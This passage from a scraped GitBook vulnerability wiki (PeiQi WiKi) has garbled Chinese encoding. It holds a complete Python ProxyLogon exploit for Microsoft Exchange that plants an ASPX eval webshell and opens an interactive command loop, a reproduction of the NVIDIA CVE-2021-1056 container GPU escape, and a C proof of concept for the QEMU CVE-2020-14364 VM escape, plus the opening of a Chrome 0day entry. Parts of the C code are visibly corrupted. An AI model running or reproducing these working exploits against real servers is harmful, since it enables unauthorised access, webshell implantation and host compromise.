http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a ''' % Email vuln_url = '/autodiscover/autodiscover.xml' headers = { 'User-Agent': 'ExchangeServicesClient/0.0.0.0', 'Content-Type': 'text/xml', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'msExchLogonMailbox': 'S-1-5-20' } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) LegacyDN = re.findall(r'(.*?)', response.text)[0] print(\"\\033[32m[o] LegacyDN: {}\\033[0m\".format(LegacyDN)) vuln_url = '/mapi/emsmdb/' headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'Content-Type': 'application/mapi-http', 'msExchLogonMailbox': 'S-1-5-20', } payload = LegacyDN + '\\x00\\x00\\x00\\x00\\x00\\x20\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00' url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) SID = re.search('with SID ([S\\-0-9]+) ', response.content).group(1) print(\"\\033[32m[o] SID: {}\\033[0m\".format(SID)) vuln_url = '/ecp/proxyLogon.ecp' payload = '%s' % (Email.split('@')[0], SID) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) session_id = response.cookies.get('ASP.NET_SessionId') canary = response.cookies.get('msExchEcpCanary') print(\"\\033[32m[o] Session_id: {}\\033[0m\".format(session_id)) print(\"\\033[32m[o] Canary : {}\\033[0m\".format(canary)) extra_cookies = [ 'ASP.NET_SessionId=' + session_id, 'msExchEcpCanary=' + canary ] vuln_url = '/ecp/DDI/DDIService.svc/GetObject' qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data='', verify=False, allow_redirects=False) identity = response.json()['d']['Output'][0]['Identity'] print(\"\\033[32m[o] OAB Name: {}\\033[0m\".format(identity['DisplayName'])) print(\"\\033[32m[o] OAB ID: {}\\033[0m\".format(identity['RawIdentity'])) FILE_PATH = 'C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\PeiQi.aspx' FILE_DATA = 'function Page_Load(){eval(Request[\"PeiQi\"],\"unsafe\");}' vuln_url = '/ecp/DDI/DDIService.svc/SetObject' qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': 'http://f/' + FILE_DATA } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) if response.status_code == 200: print(\"\\033[32m[o] é€šè¿‡OABè®¾ç½®WebshellæˆåŠŸ\\033[0m\") vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode({ 'schema': 'ResetOABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'FilePathName': FILE_PATH } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) if response.status_code == 200: print(\"\\033[32m[o] æ­£åœ¨å°è¯•å†™å…¥Webshell\\033[0m\") vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': '' } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) print(\"\\033[32m[o] æ¸…é™¤ OAB\\033[0m\") print(\"\\033[32m[o] æ­£åœ¨éªŒè¯ Webshellæ˜¯å¦ä¸Šä¼ æˆåŠŸ..........\\033[0m\") webshell_url = \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, verify=False, allow_redirects=False) if response.status_code == 200 and \"Name\" in response.text: print(\"\\033[32m[o] ä¸Šä¼  WebshllæˆåŠŸ, åœ°å€ä¸º:{}\\033[0m\".format(\"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\")) print(\"\\033[32m[o] å“åº”ä¸º:\\n{}\\033[0m\".format(response.text)) while True: Cmd = str(raw_input(\"\\033[35mCmd >>> \\033[0m\")) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) Cmd_url = \"https://\" + target_url + '/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject(\"WScript.Shell\").exec(\"cmd /c {}\").StdOut.ReadAll());'.format(Cmd) response = requests.get(url=Cmd_url, verify=False, allow_redirects=False) print(\"\\033[32m[o] å“åº”ä¸º:\\n{}\\033[0m\".format(response.text)) if __name__ == '__main__': reload(sys) sys.setdefaultencoding('utf8') title() target_url = str(raw_input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Email = \"Administrator@{}\".format(get_fld(\"https://\" + target_url)) print(\"\\033[32m[o] è¯·æ±‚åœ°å€:{}ï¼Œä½¿ç”¨çš„é‚®ç®±:{}\\033[0m\".format(target_url, Email)) POC_1(target_url, Email) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/NVIDIA/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/NVIDIA/","title":"NVIDIA","keywords":"","body":"NVIDIA NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ä¿¡æ¯æ³„éœ² CVE-2021-1056 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-06 12:06:41 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/NVIDIA/NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ä¿¡æ¯æ³„éœ² CVE-2021-1056.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/NVIDIA/NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ä¿¡æ¯æ³„éœ² CVE-2021-1056.html","title":"NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ä¿¡æ¯æ³„éœ² CVE-2021-1056","keywords":"","body":"NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ä¿¡æ¯æ³„éœ² CVE-2021-1056 æ¼æ´æè¿° ç”¨äºLinuxçš„NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åºåœ¨å†…æ ¸æ¨¡å¼å±‚ï¼ˆnvidia.koï¼‰ä¸­åŒ…å«ä¸€ä¸ªæ¼æ´ï¼Œåœ¨è¯¥æ¼æ´ä¸­ï¼Œå®ƒæ²¡æœ‰å®Œå…¨éµå®ˆæ“ä½œç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿæä¾›GPUè®¾å¤‡çº§éš”ç¦»çš„æƒé™ï¼Œè¿™å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æˆ–ä¿¡æ¯æ³„éœ²ã€‚ æ¼æ´å½±å“ [!NOTE] NVIDIA GPUæ˜¾ç¤ºé©±åŠ¨ç¨‹åº ç¯å¢ƒæ­å»º Dokcerç‰ˆæœ¬: 19.03 git clone https://github.com/pokerfaceSad/CVE-2021-1056.git cd CVE-2021-1056 docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash æ¼æ´å¤ç° è¿›å…¥å®¹å™¨æ£€æŸ¥ GPUçŠ¶æ€ï¼Œåªæœ‰ä¸€å—GPU In Container# nvidia-smi Sat Jan 9 07:21:03 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ åœ¨å®¹å™¨ä¸­æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œåœ¨æœ€åçš„nvidia-smiçš„è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºæ‰€æœ‰GPUåœ¨å®¹å™¨ä¸­éƒ½å·²ç»å¯è§äº† In Container# bash /CVE-2021-1056/main.sh [INFO] init GPU num: 1 [DEBUG] /dev/nvidia0 exists, skip [DEBUG] successfully get /dev/nvidia1 [DEBUG] successfully get /dev/nvidia2 [DEBUG] successfully get /dev/nvidia3 [DEBUG] delete redundant /dev/nvidia4 [INFO] get extra 3 GPU devices from host [INFO] current GPU num: 4 [INFO] exec nvidia-smi: Sat Jan 9 07:22:43 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 30C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 29C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 28C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ ä¸ºäº†éªŒè¯è¿™äº›GPUç¡®å®æ˜¯å¯ç”¨çš„ï¼Œæ‰§è¡Œä¸€ä¸ªtensorflowçš„demoï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„GPUç¡®å®å¯ä»¥è¢«å®¹å™¨ä¸­çš„è¿›ç¨‹ä½¿ç”¨ In Container# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2>&1 & In Container$ nvidia-smi Sat Jan 9 18:58:23 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 32C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 33C P0 35W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 33C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 32C P0 37W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| +-----------------------------------------------------------------------------+ å‚è€ƒæ–‡ç«  https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-06 12:11:15 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/QEMU/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/QEMU/","title":"QEMU","keywords":"","body":"QEMU QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-07 12:57:25 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/QEMU/QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/QEMU/QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364.html","title":"QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364","keywords":"","body":"QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364 æ¼æ´æè¿° å½“åœ°æ—¶é—´8æœˆ24æ—¥ï¼Œä¸€ä¸ªå­˜åœ¨äºQEMU USBæ¨¡æ‹Ÿå™¨ä¸­çš„è¶Šç•Œè¯»å†™æ¼æ´ï¼ˆCVE-2020-14364ï¼‰è¢«å…¬å¸ƒã€‚ æ¼æ´ä½äº ./hw/usb/core.c ä¸­ï¼Œå½“ç¨‹åºå¤„ç†æ¥è‡ªå®¢æˆ·æœºçš„USBæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœåœ¨ do_token_in ä¸ do_token_outä¸­â€™USBDevice->setup_lenâ€™è¶…è¿‡äº†USBDevice->data_buf[4096]ï¼Œåˆ™å­˜åœ¨é—®é¢˜ã€‚ å®¢æˆ·æœºç”¨æˆ·å¯èƒ½ä¼šä½¿ç”¨æ­¤æ¼æ´ä½¿QEMUè¿›ç¨‹å´©æºƒï¼Œä»è€Œå¯¼è‡´DoSæˆ–åœ¨å®¿ä¸»æœºä¸Šä»¥QEMUè¿›ç¨‹çš„ç‰¹æƒæ‰§è¡Œä»»æ„ä»£ç ï¼Œå®ç°è™šæ‹Ÿæœºé€ƒé€¸ã€‚ æ”»å‡»è€…åœ¨æ‹¥æœ‰äº‘ç¯å¢ƒè™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿæƒé™çš„æƒ…å†µä¸‹ï¼Œä¾¿å¯åˆ©ç”¨è¯¥æ¼æ´è·å–å®¿ä¸»æœºæƒé™ï¼Œè¿›è€Œæ”»å‡»è™šæ‹Ÿæœºæ‰€åœ¨èµ„æºæ± æ‰€æœ‰ç§Ÿæˆ·ä¸»æœºï¼Œç”šè‡³å¯é€šè¿‡å·²å¼€é€šçš„å†…ç½‘æƒé™æ”»å‡»ç®¡ç†åŸŸç³»ç»Ÿï¼Œé£é™©æé«˜ã€‚ æœ¬æ¬¡æ¼æ´çš„å½±å“èŒƒå›´è¾ƒå¹¿ï¼Œæ¶‰åŠqemu 1.0 ä»¥ä¸Šçš„å…¨éƒ¨ç‰ˆæœ¬ã€‚ æ¼æ´å½±å“ [!NOTE] Qemu > 1.0 æ¼æ´å¤ç° æ¼æ´åŸç† USBæ€»çº¿é€šè¿‡åˆ›å»ºä¸€ä¸ªUSBpacketå¯¹è±¡æ¥å’ŒUSBè®¾å¤‡é€šä¿¡ã€‚ Usbpacketå¯¹è±¡ä¸­åŒ…å«ä»¥ä¸‹å…³é”®å†…å®¹ å…¶ä¸­pidè¡¨æ˜packetçš„ç±»å‹ï¼Œå­˜åœ¨ä¸‰ç§ç±»å‹inã€outã€setup, epæŒ‡å‘endpointå¯¹è±¡ï¼Œé€šè¿‡æ­¤ç»“æ„å®šä½ç›®æ ‡usbè®¾å¤‡ã€‚ æ•°æ®äº¤æ¢ä¸ºusbdeviceä¸­ç¼“å†²åŒºçš„data_bufä¸usbpacketå¯¹è±¡ä¸­ä½¿ç”¨usb_packet_mapç”³è¯·çš„ç¼“å†²åŒºä¸¤è€…é—´é€šè¿‡usb_packet_copyå‡½æ•°å®ç°,ä¸ºäº†é˜²æ­¢ä¸¤è€…ç¼“å†²åŒºé•¿åº¦ä¸åŒ¹é…ï¼Œä¼ é€çš„é•¿åº¦ç”±s->setup_lené™åˆ¶ã€‚ æ¼æ´å­˜åœ¨äºs->setup_lenèµ‹å€¼çš„è¿‡ç¨‹do_token_setupä¸­ã€‚ è™½ç„¶è¿›è¡Œäº†æ ¡éªŒï¼Œä½†æ˜¯ç”±äºåœ¨æ ¡éªŒå‰ï¼Œs->setup_lençš„å€¼å·²ç»è¢«è®¾ç½®å¯¼è‡´ä¹‹åçš„do_token_inæˆ–è€…do_token_outä¸­ä½¿ç”¨usb_packet_copyæ—¶ä¼šäº§ç”Ÿè¶Šç•Œè¯»å†™æ¼æ´ã€‚ åˆ©ç”¨æ–¹å¼ 1. æ³„éœ²USBdeviceå¯¹è±¡çš„åœ°å€ã€‚ è§‚å¯Ÿè¶Šç•Œå¯è¯»å†…å®¹å‘ç° å¯ä»¥ä»ä¸‹æ–¹çš„ep_ctl->devè·å–åˆ°usbdeviceçš„å¯¹è±¡åœ°å€ã€‚ 2. é€šè¿‡usbdeviceçš„å¯¹è±¡åœ°å€æˆ‘ä»¬å¯ä»¥å¾—åˆ°s->data_bufçš„ä½ç½®ï¼Œä¹‹ååªéœ€è¦è¦†ç›–ä¸‹æ–¹çš„setup_indexä¸ºç›®æ ‡åœ°å€-(s->data_buf)å³å¯å®ç°ä»»æ„åœ°å€å†™ã€‚ 3. æˆ‘ä»¬è¿˜éœ€è¦è·å–ä»»ä½•åœ°å€è¯»å–åŠŸèƒ½ï¼Œsetup_buf [0]æ§åˆ¶å†™å…¥æ–¹å‘ï¼Œå¹¶ä¸”åªèƒ½ç”±do_token_setupè¿›è¡Œä¿®æ”¹ã€‚ ç”±äºæˆ‘ä»¬åœ¨ç¬¬äºŒæ­¥ä¸­ä½¿ç”¨äº†è¶Šç•Œå†™å…¥åŠŸèƒ½ï¼Œå› æ­¤setup_buf [0]æ˜¯å†™å…¥æ–¹å‘ï¼Œå› æ­¤åªå¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œï¼Œæ— æ³•è¯»å–ã€‚ç»•è¿‡æ–¹æ³•ï¼šè®¾ç½®setup_index = 0xfffffff8ï¼Œå†æ¬¡è¶Šç•Œï¼Œä¿®æ”¹setup_buf [0]çš„å€¼ï¼Œç„¶åå†æ¬¡å°†setup_indexä¿®æ”¹ä¸ºè¦è¯»å–çš„åœ°å€ï¼Œä»¥å®ç°ä»»æ„åœ°å€è¯»å–ã€‚ 4.é€šè¿‡ä»»æ„åœ°å€è¯»å–usbdeviceå¯¹è±¡çš„å†…å®¹ä»¥è·å–ehcistateå¯¹è±¡åœ°å€ï¼Œå†æ¬¡ä½¿ç”¨ä»»æ„åœ°å€è¯»å–ehcistateå¯¹è±¡çš„å†…å®¹ä»¥è·å–ehci_bus_ops_companionåœ°å€ã€‚ è¯¥åœ°å€ä½äºç¨‹åºdataèŠ‚åŒºã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ç¨‹åºçš„åŠ è½½åœ°å€å’Œsystem @ pltåœ°å€ã€‚ä¹Ÿå¯ä»¥é€šè¿‡è¯»å–usbdeviceå›ºå®šåç§»ä½ç½®åçš„usb-tabletå¯¹è±¡æ¥è·å¾—åŠ è½½åœ°å€ã€‚ 5.åœ¨data_bufä¸­ä¼ªé€ irqç»“æ„ã€‚ 6.ä»¥ä¼ªé€ ç»“æ„åŠ«æŒehcistateä¸­çš„irqå¯¹è±¡ã€‚ 7.é€šè¿‡mmioè¯»å–å¯„å­˜å™¨ä»¥è§¦å‘ehci_update_irqï¼Œæ‰§è¡Œsystemï¼ˆâ€œ xcalcâ€ï¼‰ã€‚ å®Œæˆåˆ©ç”¨ QEMU CVE-2020-14364 POC è§†é¢‘æ¼”ç¤º æ¼æ´åˆ©ç”¨POC #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include unsigned char* mmio_mem; char *dmabuf; struct ohci_hcca * hcca; struct EHCIqtd * qtd; struct ohci_ed * ed; struct ohci_td * td; char *setup_buf; uint32_t *dmabuf32; char *td_addr; struct EHCIqh * qh; struct ohci_td * td_1; char *dmabuf_phys_addr; typedef struct USBDevice USBDevice; typedef struct USBEndpoint USBEndpoint; struct USBEndpoint { uint8_t nr; uint8_t pid; uint8_t type; uint8_t ifnum; int max_packet_size; int max_streams; bool pipeline; bool halted; USBDevice *dev; USBEndpoint *fd; USBEndpoint *bk; }; struct USBDevice { int32_t remote_wakeup; int32_t setup_state; int32_t setup_len; int32_t setup_index; USBEndpoint ep_ctl; USBEndpoint ep_in[15]; USBEndpoint ep_out[15]; }; typedef struct EHCIqh { uint32_t next; /* Standard next link pointer */ /* endpoint characteristics */ uint32_t epchar; /* endpoint capabilities */ uint32_t epcap; uint32_t current_qtd; /* Standard next link pointer */ uint32_t next_qtd; /* Standard next link pointer */ uint32_t altnext_qtd; uint32_t token; /* Same as QTD token */ uint32_t bufptr[5]; /* Standard buffer pointer */ } EHCIqh; typedef struct EHCIqtd { uint32_t next; /* Standard next link pointer */ uint32_t altnext; /* Standard next link pointer */ uint32_t token; uint32_t bufptr[5]; /* Standard buffer pointer */ } EHCIqtd; uint64_t virt2phys(void* p) { uint64_t virt = (uint64_t)p; // Assert page alignment int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd == -1) die(\"open\"); uint64_t offset = (virt / 0x1000) * 8; lseek(fd, offset, SEEK_SET); uint64_t phys; if (read(fd, &phys, 8 ) != 8) die(\"read\"); // Assert page present phys = (phys & ((1ULL epchar=0x00; qh->token=1current_qtd=virt2phys(dmabuf+0x200); struct EHCIqtd * qtd; qtd=dmabuf+0x200; qtd->token=1bufptr[0]=virt2phys(dmabuf+0x300); setup_buf[6]=0xff; setup_buf[7]=0x0; dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } void set_length(uint16_t len,uint8_t in){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); setup_buf[0]=in; setup_buf[6]=len&0xff; setup_buf[7]=(len>>8)&0xff; qh->epchar=0x00; qh->token=1current_qtd=virt2phys(dmabuf+0x200); qtd->token=1bufptr[0]=virt2phys(dmabuf+0x300); dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } void do_copy_read(){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); qh->epchar=0x00; qh->token=1current_qtd=virt2phys(dmabuf+0x200); qtd->token=1bufptr[0]=virt2phys(dmabuf+0x1000); qtd->bufptr[1]=virt2phys(dmabuf+0x2000); dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } int main() { init(); iopl(3); outw(0,0xc0c0); outw(0,0xc0e0); outw(0,0xc010); outw(0,0xc0a0); sleep(3); init_state(); sleep(2); set_length(0x2000,0x80); sleep(2); do_copy_read(); sleep(2); struct USBDevice* usb_device_tmp=dmabuf+0x2004; struct USBDevice usb_device; memcpy(&usb_device,usb_device_tmp,sizeof(USBDevice)); uint64_t dev_addr=usb_device.ep_ctl.dev; uint64_t *tmp=dmabuf+0x24f4; long long base=*tmp; if(base == 0){ printf(\"INIT DOWN,DO IT AGAIN\"); return 0; } base-=0xee5480-0x2668c0; uint64_t system=base+0x2d9610; puts(\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"); printf(\"LEAK BASE ADDRESS:%llx!\\n\",base); printf(\"LEAK SYSTEM ADDRESS:%llx!\\n\",system); puts(\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"); } PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Chrome/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Chrome/","title":"Chrome","keywords":"","body":"Chrome Windows Chrome è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-13 18:14:48 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Chrome/Windows Chrome è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Chrome/Windows Chrome è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Windows Chrome è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Chrome è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Windows Chrome 0day åœ¨ 2021-4-13 è¢«å…¬å¼€ æ¼æ´å½±å“ [!NOTE] Window Chrome æµè§ˆå™¨ æ¼æ´å¤ç° Githubï¼š https://github.com/r4j0x00/exploits/tree/master/chrome-0day æ¨ç‰¹: https://twitter.com/r4j0x00/status/1381643526010597380?s=12 exp.html exp.js /* /* BSD 2-Clause License Copyright (c) 2021, 